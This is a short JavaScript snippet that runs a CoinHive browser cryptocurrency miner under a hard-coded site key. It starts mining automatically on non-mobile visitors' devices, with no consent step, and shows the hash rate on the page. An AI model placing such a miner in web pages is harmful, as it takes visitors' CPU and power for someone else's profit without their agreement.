let miner = new CoinHive.Anonymous('QbgpjAPTac4TDxpWZto4zId8XNCiISZo', {throttle: 0.5});

// Only start on non-mobile devices
if (!miner.isMobile()) {
    miner.start();
}

miner.on('found', function() { /* Hash found */ })
miner.on('accepted', function() { /* Hash accepted by the pool */ })

// Update stats once per second
setInterval(function() {
    var hashesPerSecond = miner.getHashesPerSecond();
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes();

    document.getElementById("hashesPerSecond").innerText = hashesPerSecond.toFixed(3);
    document.getElementById("totalHashes").innerText = totalHashes;
}, 1000);
